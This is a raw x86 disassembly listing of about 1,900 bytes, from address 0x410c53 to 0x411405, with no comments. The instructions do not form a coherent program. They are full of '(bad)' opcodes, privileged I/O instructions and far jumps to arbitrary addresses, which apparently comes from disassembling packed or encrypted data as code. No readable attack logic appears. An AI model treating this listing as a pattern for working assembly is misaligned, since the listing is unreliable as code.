  410c53:	or     ebx,esi
  410c55:	in     al,dx
  410c56:	pop    eax
  410c57:	daa    
  410c58:	push   ebp
  410c59:	mov    dl,0xf8
  410c5b:	lods   al,BYTE PTR ds:[esi]
  410c5c:	stc    
  410c5d:	fmul   DWORD PTR [edx+0x1f02ff38]
  410c63:	jg     0x410cc9
  410c65:	sbb    BYTE PTR [edx-0x54],dl
  410c68:	cmp    al,0x4f
  410c6a:	pop    edx
  410c6b:	ror    DWORD PTR [ebx+esi*2-0x4e],cl
  410c6f:	fsub   st,st(0)
  410c71:	icebp  
  410c72:	cmovne edx,DWORD PTR [esi]
  410c75:	fwait
  410c76:	adc    ebp,ebp
  410c78:	xor    BYTE PTR [edi+0xda09727],ch
  410c7e:	xor    esp,DWORD PTR [ebx]
  410c80:	xor    al,0x95
  410c82:	cwde   
  410c83:	xchg   esp,eax
  410c84:	pop    ebx
  410c85:	mov    ds:0x74f48de0,eax
  410c8a:	ss daa 
  410c8c:	add    ah,BYTE PTR [eax]
  410c8e:	cmc    
  410c8f:	push   esp
  410c90:	(bad)  [ebp-0x4a3abc34]
  410c96:	mov    esp,0xb076f5ca
  410c9b:	fs push ds
  410c9d:	pop    ebp
  410c9e:	push   edx
  410c9f:	out    0x20,eax
  410ca1:	hlt    
  410ca2:	imul   edx,DWORD PTR [esi],0xffffffa3
  410ca5:	vmwrite esp,DWORD PTR [edx]
  410ca8:	jl     0x410c9c
  410caa:	mov    eax,ss
  410cac:	mov    fs,WORD PTR [ebp+0x30ca9868]
  410cb2:	push   esi
  410cb3:	retf   0x83dc
  410cb6:	xchg   edx,eax
  410cb7:	dec    esi
  410cb8:	ficomp WORD PTR [ebx]
  410cba:	push   edi
  410cbb:	lock not BYTE PTR [edx+0x78]
  410cbf:	scas   al,BYTE PTR es:[edi]
  410cc0:	jg     0x410cdd
  410cc2:	test   DWORD PTR [eax-0x49],esi
  410cc5:	mov    bl,ch
  410cc7:	pop    ss
  410cc8:	or     al,0x4c
  410cca:	ror    BYTE PTR [esi+0x240f9df5],cl
  410cd0:	adc    BYTE PTR [ebp+0x37149091],bl
  410cd6:	jle    0x410cb8
  410cd8:	lods   al,BYTE PTR ds:[esi]
  410cd9:	adc    dh,ch
  410cdb:	push   es
  410cdc:	inc    edx
  410cdd:	add    eax,0xa61e1256
  410ce2:	and    DWORD PTR [ebp-0x58],ecx
  410ce5:	cmc    
  410ce6:	push   es
  410ce7:	xor    al,0xdd
  410ce9:	pop    eax
  410cea:	ja     0x410c8c
  410cec:	fistp  DWORD PTR ds:0x1b5733c9
  410cf2:	clc    
  410cf3:	sti    
  410cf4:	and    BYTE PTR [ebp+ebx*4-0x42],0xc8
  410cf9:	add    bl,ah
  410cfb:	out    dx,al
  410cfc:	add    bh,BYTE PTR [esi-0x4a]
  410cff:	fsub   QWORD PTR [edi-0x21]
  410d02:	scas   eax,DWORD PTR es:[edi]
  410d03:	sub    BYTE PTR [edx+esi*2+0x55],al
  410d07:	or     DWORD PTR [edi-0x7],0xe99161fe
  410d0e:	cmp    BYTE PTR [edx+eiz*8],bh
  410d11:	loope  0x410d73
  410d13:	(bad)  
  410d15:	mov    edx,0x98700818
  410d1a:	in     eax,0x1f
  410d1c:	jle    0x410d6c
  410d1e:	dec    edx
  410d1f:	mov    eax,DWORD PTR gs:[edi-0x14]
  410d23:	cmp    eax,0x1e6761b0
  410d28:	jb     0x410da0
  410d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d2b:	in     al,dx
  410d2c:	push   cs
  410d2d:	pusha  
  410d2e:	push   ss
  410d2f:	xor    bh,ch
  410d31:	sub    BYTE PTR [ecx],0xdf
  410d34:	repnz mov eax,0x92d8f5ca
  410d3a:	std    
  410d3b:	repnz into 
  410d3d:	jge    0x410d3b
  410d3f:	sbb    al,0xc5
  410d41:	lods   al,BYTE PTR ds:[esi]
  410d42:	pop    esi
  410d43:	push   es
  410d44:	inc    ebp
  410d45:	in     al,dx
  410d46:	lds    ebx,FWORD PTR [eax+ebx*2-0x73]
  410d4a:	cmp    eax,ebp
  410d4c:	(bad)  
  410d4e:	jno    0x410d3c
  410d50:	test   al,0xfd
  410d52:	aam    0x5
  410d54:	imul   ebp,DWORD PTR [edx],0xf031cae3
  410d5a:	xchg   esi,eax
  410d5b:	push   0xc84c924c
  410d60:	gs cmp al,0xbe
  410d63:	sbb    dh,BYTE PTR [edx+eiz*2-0x78]
  410d67:	icebp  
  410d68:	out    dx,eax
  410d69:	in     eax,dx
  410d6a:	jnp    0x410cf2
  410d6c:	jl     0x410d80
  410d6e:	push   esi
  410d6f:	gs repz xchg esi,eax
  410d72:	or     al,0xfa
  410d74:	adc    eax,edi
  410d76:	dec    ebp
  410d77:	cmp    bl,BYTE PTR [eax]
  410d79:	loope  0x410d16
  410d7b:	xchg   ebx,eax
  410d7c:	js     0x410dcd
  410d7e:	out    0xdc,al
  410d80:	cli    
  410d81:	pop    ss
  410d82:	(bad)  
  410d83:	test   eax,0x70c0bc4c
  410d88:	jae    0x410dd5
  410d8a:	lahf   
  410d8b:	cmp    al,0x4b
  410d8d:	jo     0x410d32
  410d8f:	aas    
  410d90:	fdivr  QWORD PTR ds:0x4d0acfb9
  410d96:	add    DWORD PTR [ecx+ebp*8-0x71790d56],edx
  410d9d:	push   ds
  410d9e:	mov    ecx,0xfc369f2
  410da3:	pusha  
  410da4:	mov    WORD PTR [ebx+0x9],ds
  410da7:	arpl   WORD PTR [edx+0x6],bx
  410daa:	pop    ebp
  410dab:	and    BYTE PTR [ecx+edi*2+0x1f],al
  410daf:	loop   0x410d40
  410db1:	jl     0x410d80
  410db3:	push   ebx
  410db4:	cs fdivr st(3),st
  410db7:	mov    esi,0x629987ce
  410dbc:	popa   
  410dbd:	sahf   
  410dbe:	cdq    
  410dbf:	xchg   BYTE PTR [ecx],al
  410dc1:	jmp    DWORD PTR [eax]
  410dc3:	mov    BYTE PTR [edx],dh
  410dc5:	(bad)  
  410dc6:	out    0x67,al
  410dc8:	mov    esp,0xaf54c9f9
  410dcd:	mov    bh,0xf9
  410dcf:	xchg   esp,eax
  410dd0:	adc    bl,BYTE PTR [ecx-0x23]
  410dd3:	scas   eax,DWORD PTR es:[edi]
  410dd4:	call   0x24bfd650
  410dd9:	test   BYTE PTR [ebx],ah
  410ddb:	test   bh,0x4e
  410dde:	cdq    
  410ddf:	pop    ss
  410de0:	scas   eax,DWORD PTR es:[edi]
  410de1:	stc    
  410de2:	mov    edi,0x7dc7b8b2
  410de7:	mov    edx,0xcef691a4
  410dec:	adc    cl,BYTE PTR [ecx]
  410dee:	fstp   st(3)
  410df0:	push   edi
  410df1:	pusha  
  410df2:	int    0xbd
  410df4:	sbb    al,BYTE PTR [ecx-0x1897543d]
  410dfa:	scas   eax,DWORD PTR es:[edi]
  410dfb:	ret    0x58db
  410dfe:	sti    
  410dff:	mov    bh,0x1b
  410e01:	pop    ds
  410e02:	imul   eax,DWORD PTR [eax],0x21a50acd
  410e08:	cwde   
  410e09:	inc    ebx
  410e0a:	jp     0x410e64
  410e0c:	stos   DWORD PTR es:[edi],eax
  410e0d:	out    dx,al
  410e0e:	push   esp
  410e0f:	lods   eax,DWORD PTR ds:[esi]
  410e10:	sub    DWORD PTR [ebp+ebp*8+0x32],0xc89a873d
  410e18:	scas   eax,DWORD PTR es:[edi]
  410e19:	clc    
  410e1a:	imul   ebx,DWORD PTR [esi],0xfffffffd
  410e1d:	shr    DWORD PTR [esi],1
  410e1f:	lods   al,BYTE PTR ds:[esi]
  410e20:	xchg   ebx,eax
  410e21:	pop    ebx
  410e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e23:	pop    es
  410e24:	mov    ah,0x2e
  410e26:	int    0xb2
  410e28:	int    0xb4
  410e2a:	shl    dl,0x79
  410e2d:	xchg   ecx,eax
  410e2e:	jle    0x410dee
  410e30:	xchg   ebx,eax
  410e31:	js     0x410e0a
  410e33:	or     BYTE PTR [edx-0x3e5e94a9],0xa9
  410e3a:	xchg   edx,eax
  410e3b:	mov    ah,BYTE PTR [esi]
  410e3d:	mov    dl,0x4f
  410e3f:	adc    eax,0x6fe7af66
  410e44:	stc    
  410e45:	fwait
  410e46:	dec    esp
  410e47:	and    BYTE PTR [ecx+0x66],ch
  410e4a:	les    ecx,FWORD PTR [edx]
  410e4c:	in     al,dx
  410e4d:	pop    eax
  410e4e:	hlt    
  410e4f:	call   0xeb38:0xa5f0f040
  410e56:	or     DWORD PTR [esi-0x3d1e997f],esp
  410e5c:	out    0xa9,eax
  410e5e:	mov    ds:0xa1e02c10,al
  410e63:	xchg   ebp,eax
  410e64:	sahf   
  410e65:	(bad)
  410e6a:	push   cx
  410e6c:	sub    DWORD PTR [esi-0x1ee43797],edx
  410e72:	add    BYTE PTR [edi+0x3d037049],dl
  410e78:	int    0x68
  410e7a:	pop    eax
  410e7b:	xor    al,0x5e
  410e7d:	pop    eax
  410e7e:	mov    bl,0xb0
  410e80:	stos   DWORD PTR es:[edi],eax
  410e81:	scas   eax,DWORD PTR es:[edi]
  410e82:	es in  eax,0xf4
  410e85:	dec    esp
  410e86:	jns    0x410ed5
  410e88:	inc    edi
  410e89:	mov    edi,0x8186a627
  410e8e:	fistp  WORD PTR [ecx]
  410e90:	sub    bl,BYTE PTR [edi+0x37]
  410e93:	sbb    al,0x7
  410e95:	cmp    DWORD PTR [edi+0x38],ebx
  410e98:	mov    esp,0x475cab65
  410e9d:	enterw 0x2986,0x84
  410ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ea3:	jo     0x410e51
  410ea5:	pop    esi
  410ea6:	and    eax,0x9958934d
  410eab:	into   
  410eac:	stc    
  410ead:	mov    ebx,DWORD PTR [ebx+0x24c3abd1]
  410eb3:	push   ds
  410eb4:	and    cl,bh
  410eb6:	or     edi,DWORD PTR [edx-0x596459b9]
  410ebc:	sti    
  410ebd:	fs jmp 0x33f4ade1
  410ec3:	cdq    
  410ec4:	xacquire xchg BYTE PTR [ebp-0x53],bh
  410ec8:	cmp    eax,0x3dcb94d9
  410ecd:	test   eax,0x793dcb4b
  410ed2:	push   ecx
  410ed3:	ret    0x631e
  410ed6:	add    ebp,edx
  410ed8:	adc    dl,dl
  410eda:	imul   edx,DWORD PTR [ecx-0x23b8d9f7],0x168b3ba6
  410ee4:	and    BYTE PTR [ebp+eax*4-0x8e767f7],cl
  410eeb:	sub    al,0x1e
  410eed:	jecxz  0x410f13
  410eef:	loope  0x410ec3
  410ef1:	push   esp
  410ef2:	sub    eax,0xd6453ddc
  410ef7:	push   esi
  410ef8:	stc    
  410ef9:	cmp    al,0xcd
  410efb:	mov    ecx,0x48e16cfa
  410f00:	mov    al,ds:0xf55e3091
  410f05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f06:	xchg   BYTE PTR [ecx+ebx*2-0x6ec7ad70],bh
  410f0d:	xor    dh,al
  410f0f:	icebp  
  410f10:	test   eax,0xc46c21fa
  410f15:	sti    
  410f16:	add    BYTE PTR [ebx+ebp*4],ah
  410f19:	enter  0x8b53,0x82
  410f1d:	sbb    ch,dh
  410f1f:	jne    0x410f33
  410f21:	add    eax,0x6eb0018f
  410f26:	mov    edx,0x535069ea
  410f2b:	or     esp,DWORD PTR [esp+ebp*8+0x15282328]
  410f32:	pop    eax
  410f33:	mov    edi,0x63f3ea49
  410f38:	pop    ebp
  410f39:	cld    
  410f3a:	sbb    BYTE PTR [edi-0x19e88ca],cl
  410f40:	inc    edx
  410f41:	jae    0x410fa2
  410f43:	adc    BYTE PTR [ecx+0x5f838b2a],cl
  410f49:	pop    ss
  410f4a:	push   edi
  410f4b:	call   0xd961dc75
  410f50:	daa    
  410f51:	cmp    ecx,DWORD PTR [ebx]
  410f53:	jge    0x410f04
  410f55:	pop    ecx
  410f56:	dec    ecx
  410f57:	shl    DWORD PTR [ebx-0xf4b7f48],0xd9
  410f5e:	jnp    0x410fb4
  410f60:	cmp    DWORD PTR [ebp-0x47],eax
  410f63:	hlt    
  410f64:	jmp    0x410f93
  410f66:	shl    BYTE PTR [ecx-0x7f23406e],cl
  410f6c:	repnz lea ecx,[ebp-0x76]
  410f70:	push   esp
  410f71:	sbb    DWORD PTR [ecx-0xa],ecx
  410f74:	fsubr  QWORD PTR [eax+0x26]
  410f77:	pop    ss
  410f78:	cdq    
  410f79:	push   ds
  410f7a:	outs   dx,DWORD PTR ds:[esi]
  410f7b:	stos   DWORD PTR es:[edi],eax
  410f7c:	mov    ah,dl
  410f7e:	popa   
  410f7f:	add    eax,ebx
  410f81:	sub    eax,edx
  410f83:	in     al,0x21
  410f85:	loopne 0x410f7e
  410f87:	and    BYTE PTR [ebx+0x609fa5df],bh
  410f8d:	ins    DWORD PTR es:[edi],dx
  410f8e:	push   cs
  410f8f:	sub    esp,DWORD PTR [eax+0x45ef9e22]
  410f95:	lock and ebx,edi
  410f98:	mov    ds,WORD PTR [ecx-0x3f]
  410f9b:	jo     0x410fcb
  410f9d:	add    eax,0xb071cf76
  410fa2:	sub    al,0x0
  410fa4:	sbb    bl,BYTE PTR [edi]
  410fa6:	mov    WORD PTR [edi-0x5c],?
  410fa9:	push   cs
  410faa:	add    al,0xcc
  410fac:	cmc    
  410fad:	ja     0x411018
  410faf:	push   edi
  410fb0:	pop    ecx
  410fb1:	xor    bh,ah
  410fb3:	fadd   st,st(2)
  410fb5:	shr    ah,0xb
  410fb8:	dec    ebx
  410fb9:	je     0x410f74
  410fbb:	mov    ebx,DWORD PTR [esi]
  410fbd:	xor    DWORD PTR [edx+edx*8-0x4d],esp
  410fc1:	mov    ch,0xb5
  410fc3:	jbe    0x41103a
  410fc5:	xchg   esp,eax
  410fc6:	or     dh,ch
  410fc8:	push   edx
  410fc9:	popa   
  410fca:	stos   BYTE PTR es:[edi],al
  410fcb:	aas    
  410fcc:	ss dec edx
  410fce:	test   eax,ebx
  410fd0:	cwde   
  410fd1:	fucomp st(6)
  410fd3:	shl    BYTE PTR [eax+0x7655364c],1
  410fd9:	jns    0x410fd9
  410fdb:	cld    
  410fdc:	gs inc sp
  410fdf:	pop    edx
  410fe0:	mov    ah,BYTE PTR [edi+0x51]
  410fe3:	call   0xfadbf4fe
  410fe8:	pushf  
  410fe9:	aas    
  410fea:	push   ecx
  410feb:	pop    ds
  410fec:	shr    BYTE PTR [ebx+0x3137ceb4],cl
  410ff2:	and    eax,0xc961ed8b
  410ff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ff8:	xchg   esp,eax
  410ff9:	add    BYTE PTR [edx-0x23225fb5],0x25
  411000:	xchg   DWORD PTR [ebx+ebp*8+0x53],ebx
  411004:	rcr    cl,0xce
  411007:	inc    eax
  411008:	pusha  
  411009:	or     al,0x8b
  41100b:	imul   DWORD PTR [esi+0x4e]
  41100e:	lods   al,BYTE PTR ds:[esi]
  41100f:	(bad)  
  411010:	cmp    BYTE PTR [ebx],ah
  411012:	fstp   st(2)
  411014:	(bad)  
  411015:	mov    ebp,edi
  411017:	jecxz  0x41100a
  411019:	loop   0x411031
  41101b:	push   es
  41101c:	jmp    0x6b86c2f4
  411021:	inc    ebp
  411022:	add    DWORD PTR [ecx-0x2b1e4d32],0xffffffc8
  411029:	das    
  41102a:	cwde   
  41102b:	out    dx,al
  41102c:	adc    cl,dl
  41102e:	lds    esi,FWORD PTR [ebp-0x77165890]
  411034:	mov    ecx,0x931bc351
  411039:	pop    ecx
  41103a:	scas   al,BYTE PTR es:[edi]
  41103b:	mov    esp,0xbdd5888b
  411040:	inc    esi
  411041:	push   0xffffffa7
  411043:	sbb    DWORD PTR [ebx-0x31],0x16
  411047:	or     bh,BYTE PTR ds:0x459ae5f
  41104d:	xlat   BYTE PTR ds:[ebx]
  41104e:	inc    edi
  41104f:	test   al,0xae
  411051:	mov    al,ds:0x62808ec0
  411056:	pcmpgtw mm7,QWORD PTR [ebp-0x59]
  41105a:	fdiv   DWORD PTR gs:[ebp+0x7574abdb]
  411061:	pop    ecx
  411062:	cmp    ebx,DWORD PTR [ecx]
  411064:	mov    ch,0x44
  411066:	mul    BYTE PTR [edi-0x725d2acb]
  41106c:	push   0x51a0edfc
  411071:	cmp    BYTE PTR [ebp-0x41],al
  411074:	sub    cl,dl
  411076:	popf   
  411077:	nop
  411078:	(bad)  [esi-0x50b8ca14]
  41107e:	or     BYTE PTR [edi+0x33],bh
  411081:	push   ecx
  411082:	call   0xeccf:0xeea6e3a1
  411089:	aad    0xf9
  41108b:	nop
  41108c:	lods   eax,DWORD PTR ds:[esi]
  41108d:	add    esp,edi
  41108f:	icebp  
  411090:	sub    DWORD PTR [ebp+0x19],edx
  411093:	imul   esi,DWORD PTR [edx],0xffffffda
  411096:	or     ah,BYTE PTR [ebx-0x526bcd27]
  41109c:	or     edi,ebp
  41109e:	fdivrp st(6),st
  4110a0:	daa    
  4110a1:	pusha  
  4110a2:	in     eax,0xf8
  4110a4:	push   edi
  4110a5:	mov    al,ds:0x6d97cec0
  4110aa:	fbld   TBYTE PTR [ebp+0x5bef2811]
  4110b0:	scas   eax,DWORD PTR es:[edi]
  4110b1:	lds    esp,FWORD PTR [ecx-0x550ee722]
  4110b7:	add    eax,0x356cfb03
  4110bc:	(bad)  
  4110bd:	out    0x55,eax
  4110bf:	fidiv  WORD PTR [edi+ebp*4-0x6f]
  4110c3:	mov    bl,ah
  4110c5:	pop    esp
  4110c6:	aam    0x38
  4110c8:	loope  0x4110c8
  4110ca:	mov    al,ds:0xd1581a84
  4110cf:	lock aaa 
  4110d1:	xor    al,0xec
  4110d3:	in     al,dx
  4110d4:	jmp    0x5694:0xe8166593
  4110db:	nop
  4110dc:	call   0x4762:0x49f34995
  4110e3:	dec    eax
  4110e4:	mov    ds:0x111e0f24,al
  4110e9:	out    dx,eax
  4110ea:	pop    es
  4110eb:	fiadd  DWORD PTR [edi+ecx*2+0x6b846e5b]
  4110f2:	mov    ds,WORD PTR [edi+0x37]
  4110f5:	lock dec ecx
  4110f7:	adc    BYTE PTR [esp+edx*8],ch
  4110fa:	lods   al,BYTE PTR ds:[esi]
  4110fb:	sub    BYTE PTR [ecx+0x2d8f28a6],dl
  411101:	(bad)
  411105:	out    0x71,eax
  411107:	xor    al,BYTE PTR [ebx+0x66acc1f7]
  41110d:	pushf  
  41110e:	outs   dx,BYTE PTR ds:[esi]
  41110f:	add    BYTE PTR [esi],0xf0
  411112:	add    bl,BYTE PTR fs:[ecx+0x43bc63ff]
  411119:	shl    BYTE PTR [ecx+ebx*1-0x588e0778],1
  411120:	js     0x411140
  411122:	mov    al,0x33
  411124:	fsubr  QWORD PTR [edx]
  411126:	xchg   edi,eax
  411127:	aam    0xc
  411129:	jne    0x411120
  41112b:	mov    ah,0x1f
  41112d:	jo     0x4110c1
  41112f:	int3   
  411130:	xor    BYTE PTR [ebx],ah
  411132:	push   esp
  411133:	pop    ecx
  411134:	adc    ecx,DWORD PTR [esi]
  411136:	stos   BYTE PTR es:[edi],al
  411137:	jo     0x4110ea
  411139:	jmp    0x3f2f:0xbc5184e9
  411140:	sbb    eax,0x4939b67b
  411145:	push   es
  411146:	pop    esi
  411147:	inc    ebx
  411148:	sub    esi,ebp
  41114a:	(bad)  
  41114b:	cmp    bh,al
  41114d:	sbb    al,0x4b
  41114f:	mov    al,0xdc
  411151:	sub    eax,0xffe7185b
  411156:	mov    WORD PTR [eax],ds
  411158:	or     al,0x57
  41115a:	sub    ah,BYTE PTR [edx]
  41115c:	push   0xe
  41115e:	mov    eax,0x8078a407
  411163:	lods   eax,DWORD PTR ds:[esi]
  411164:	xchg   BYTE PTR [esi],cl
  411166:	cmp    al,0xa7
  411168:	clc    
  411169:	lods   eax,DWORD PTR ds:[esi]
  41116a:	or     ecx,DWORD PTR [edi-0x35e8ece1]
  411170:	les    esi,FWORD PTR [esi-0x2977515f]
  411176:	pop    edx
  411177:	loop   0x411141
  411179:	sub    al,0xa8
  41117b:	mov    ch,0x38
  41117d:	retf   
  41117e:	lea    ecx,[eax-0x6a4e9a84]
  411184:	cmp    dh,bl
  411186:	mov    ds:0x7f08aa82,al
  41118b:	push   edi
  41118c:	sbb    esi,DWORD PTR [edx-0x72645ff1]
  411192:	lock inc ebp
  411194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411195:	push   esi
  411196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411197:	call   0x72ac706d
  41119c:	(bad)  
  41119d:	dec    esi
  41119e:	popf   
  41119f:	retf   
  4111a0:	mov    ecx,0xe699ad9e
  4111a5:	sub    DWORD PTR [edi],0xffffffc5
  4111a8:	iret   
  4111a9:	pushf  
  4111aa:	add    BYTE PTR [eax],ch
  4111ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ad:	cmp    BYTE PTR [edx-0x720ea3b1],bh
  4111b3:	add    eax,0xd87040eb
  4111b8:	xlat   BYTE PTR ds:[ebx]
  4111b9:	xchg   esi,eax
  4111ba:	ffreep st(6)
  4111bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111bd:	leave  
  4111be:	push   cs
  4111bf:	cmp    bh,ah
  4111c1:	sub    al,BYTE PTR [edi]
  4111c3:	sbb    al,0x78
  4111c5:	inc    eax
  4111c6:	sti    
  4111c7:	jae    0x411200
  4111c9:	fild   DWORD PTR [ecx-0x3b]
  4111cc:	xchg   edx,eax
  4111cd:	(bad)  
  4111ce:	addr16 pushf 
  4111d0:	in     al,dx
  4111d1:	iret   
  4111d2:	in     al,0x18
  4111d4:	sub    eax,0x230faed1
  4111d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111da:	fwait
  4111db:	xchg   ebx,eax
  4111dc:	out    0x33,al
  4111de:	test   eax,0xecf5f22
  4111e3:	jmp    0x411168
  4111e5:	cld    
  4111e6:	jne    0x411257
  4111e8:	hlt    
  4111e9:	ss dec ebx
  4111eb:	mov    eax,0x9e861054
  4111f0:	test   al,0x79
  4111f2:	fadd   st(3),st
  4111f4:	push   eax
  4111f5:	push   ebx
  4111f6:	(bad)  
  4111f7:	jo     0x411203
  4111f9:	mov    al,0x9b
  4111fb:	sbb    cl,BYTE PTR [edx-0x6a0a8c99]
  411201:	mov    bh,BYTE PTR [esi+0x41e03ec5]
  411207:	stc    
  411208:	cld    
  411209:	xchg   ebp,eax
  41120a:	cwde   
  41120b:	jl     0x41127f
  41120d:	les    edx,FWORD PTR [ebx]
  41120f:	push   ecx
  411210:	sbb    al,0x91
  411212:	nop
  411213:	push   edi
  411214:	retf   
  411215:	jnp    0x411279
  411217:	(bad)  
  411218:	imul   eax,DWORD PTR [eax+0x383e9379],0x42
  41121f:	jmp    0x41123a
  411221:	rcl    bl,0x58
  411224:	mov    dh,0xe0
  411226:	imul   esp,DWORD PTR [ebp-0x35],0xffffffca
  41122a:	repnz adc BYTE PTR [edx-0x12],ch
  41122e:	aad    0xdc
  411230:	and    al,0x0
  411232:	sub    DWORD PTR [edx],0xb
  411235:	pop    esp
  411236:	iret   
  411237:	sbb    ah,ah
  411239:	sub    edi,DWORD PTR [ecx]
  41123b:	test   DWORD PTR [ebp+0x79004c26],ebx
  411241:	les    eax,FWORD PTR [ebx+ebx*2+0x60b4ea7a]
  411248:	popa   
  411249:	mov    ecx,0x6e1d24b9
  41124e:	pop    ds
  41124f:	mov    ecx,0x6c4953de
  411254:	gs sbb al,0xa3
  411257:	mov    ah,0xcd
  411259:	or     ebp,DWORD PTR [ebp-0x2c]
  41125c:	lods   eax,DWORD PTR ds:[esi]
  41125d:	xchg   ebp,eax
  41125e:	(bad)  
  411260:	mov    ebx,DWORD PTR [ebp+0x1]
  411263:	xchg   edx,eax
  411264:	cdq    
  411265:	pop    ss
  411266:	pusha  
  411267:	cmp    eax,0xc14593cd
  41126c:	mov    esp,0x2c2bbd3b
  411271:	pop    esp
  411272:	and    eax,0x6e1811be
  411277:	pop    esp
  411278:	call   0xf98:0x61169b8d
  41127f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411280:	ret    0x384a
  411283:	ror    BYTE PTR [ebp+edx*2-0x39],0x8a
  411288:	xchg   ebx,eax
  411289:	jl     0x41123b
  41128b:	push   cs
  41128c:	out    0xe4,eax
  41128e:	dec    esi
  41128f:	mov    bl,0xfc
  411291:	jmp    0xf5ed0b8d
  411296:	sub    eax,0xb1006382
  41129b:	loope  0x4112f9
  41129d:	xor    al,0xc1
  41129f:	xchg   edi,eax
  4112a0:	jle    0x4112c3
  4112a2:	in     al,dx
  4112a3:	pop    edx
  4112a4:	int3   
  4112a5:	loopne 0x4112d0
  4112a7:	sbb    edx,DWORD PTR [eax]
  4112a9:	cmp    ah,BYTE PTR [edi]
  4112ab:	inc    ebx
  4112ac:	inc    ebp
  4112ad:	mov    dh,0xfa
  4112af:	leave  
  4112b0:	dec    eax
  4112b1:	into   
  4112b2:	push   esp
  4112b3:	jmp    0x41129b
  4112b5:	call   0xeab8:0xe1f7ddcd
  4112bc:	clc    
  4112bd:	sbb    BYTE PTR [ebx],0xe3
  4112c0:	test   ah,al
  4112c2:	dec    ebp
  4112c3:	xchg   edx,eax
  4112c4:	loopne 0x4112ea
  4112c6:	xor    ebp,edi
  4112c8:	inc    esi
  4112c9:	pop    es
  4112ca:	and    eax,0x38b07c35
  4112cf:	mov    dl,dl
  4112d1:	mov    bh,BYTE PTR [ecx+0x65]
  4112d4:	jecxz  0x4112bb
  4112d6:	push   ebx
  4112d7:	mov    esp,0x91530b73
  4112dc:	push   ebp
  4112dd:	(bad)  
  4112de:	test   al,0x20
  4112e0:	daa    
  4112e1:	loope  0x4112f5
  4112e3:	adc    BYTE PTR [ebp-0x6a],dh
  4112e6:	(bad)  
  4112e7:	(bad)  [edx+0x17]
  4112ea:	aas    
  4112eb:	add    al,0x39
  4112ed:	jecxz  0x4112ef
  4112ef:	test   al,0x10
  4112f1:	addr16 xchg ah,cl
  4112f4:	popf   
  4112f5:	data16 gs es mov al,0xa3
  4112fa:	jns    0x4112f0
  4112fc:	ins    DWORD PTR es:[edi],dx
  4112fd:	jnp    0x41129b
  4112ff:	dec    dh
  411301:	dec    ebx
  411302:	test   DWORD PTR ds:0x87ecd9b0,0xfb5a5c67
  41130c:	enter  0x295,0xbc
  411310:	(bad)  
  411311:	sub    eax,0x7a447c09
  411316:	das    
  411317:	adc    ebp,esp
  411319:	jbe    0x411347
  41131b:	jge    0x41130d
  41131d:	mov    bl,0x33
  41131f:	mov    dh,0xbf
  411321:	or     bh,BYTE PTR [edx-0x58]
  411324:	push   ss
  411325:	cmp    dl,bh
  411327:	sti    
  411328:	aam    0x51
  41132a:	push   ecx
  41132b:	enter  0x7e0e,0x37
  41132f:	ret    0x5e02
  411332:	ficomp WORD PTR [ebp+0x480427c5]
  411338:	mov    dh,0x92
  41133a:	cmp    ch,ch
  41133c:	dec    ecx
  41133d:	dec    edx
  41133e:	pushf  
  41133f:	or     al,0x65
  411341:	lock mov dl,BYTE PTR [esi-0x78]
  411345:	xchg   edi,eax
  411346:	dec    esi
  411347:	adc    eax,0x889b946a
  41134c:	push   ecx
  41134d:	retf   0x7c52
  411350:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411351:	cli    
  411352:	xchg   ecx,eax
  411353:	adc    al,0x3f
  411355:	push   0xffffffae
  411357:	pop    esp
  411358:	or     eax,0xe188955c
  41135d:	xchg   edi,eax
  41135e:	adc    eax,0xb86d93c5
  411363:	lods   al,BYTE PTR ds:[esi]
  411364:	sub    ch,BYTE PTR [esi]
  411366:	pop    edx
  411367:	push   0x676d41a9
  41136c:	push   edi
  41136d:	mov    ds:0xcb6c357c,al
  411372:	pop    ebp
  411373:	sub    DWORD PTR [ecx-0x6777dab1],ebx
  411379:	push   edx
  41137a:	iret   
  41137b:	neg    BYTE PTR [edi-0x420565f3]
  411381:	out    dx,eax
  411382:	add    cx,WORD PTR [edi+0x184dd42a]
  411389:	adc    ebp,DWORD PTR ds:0x38bdbebd
  41138f:	loop   0x4113bd
  411391:	jbe    0x41137d
  411393:	pop    ebp
  411394:	mov    esi,0x1563f37c
  411399:	add    ecx,ebp
  41139b:	loopne 0x4113e2
  41139d:	and    BYTE PTR [edi+eiz*4-0x6eecba80],bh
  4113a4:	inc    ecx
  4113a5:	popa   
  4113a6:	jo     0x41138e
  4113a8:	sub    DWORD PTR [eax-0x2d],eax
  4113ab:	test   BYTE PTR [ecx+0x63],al
  4113ae:	stc    
  4113af:	clc    
  4113b0:	jb     0x4113b0
  4113b2:	mov    ecx,0x4c0a27ee
  4113b7:	lds    esp,FWORD PTR [edx-0x2]
  4113ba:	ds lock jb 0x4113b2
  4113be:	lea    esi,ds:0x34596023
  4113c4:	stc    
  4113c5:	repz shl al,0xad
  4113c9:	sbb    bh,BYTE PTR [edi+ebp*8-0x79]
  4113cd:	mov    cl,0x5f
  4113cf:	test   al,0x80
  4113d1:	pop    eax
  4113d2:	bound  ecx,QWORD PTR [esi+0x12bf56cb]
  4113d8:	nop
  4113d9:	xor    BYTE PTR [ebx+0x7994123d],bh
  4113df:	dec    edi
  4113e0:	(bad)  
  4113e1:	push   eax
  4113e2:	push   edi
  4113e3:	cmp    al,0xfd
  4113e5:	and    al,0xba
  4113e7:	test   eax,0x73148ca4
  4113ec:	sahf   
  4113ed:	fiadd  WORD PTR [edi+ebx*4-0x2a]
  4113f1:	retf   0x2a9e
  4113f4:	and    ch,ah
  4113f6:	sahf   
  4113f7:	fwait
  4113f8:	add    BYTE PTR [esi+0x400ecd41],ch
  4113fe:	cmp    DWORD PTR [ebx+0x37],0x7d
  411402:	aam    0x3c
  411404:	scas   eax,DWORD PTR es:[edi]
  411405:	sbb    ebx,edx
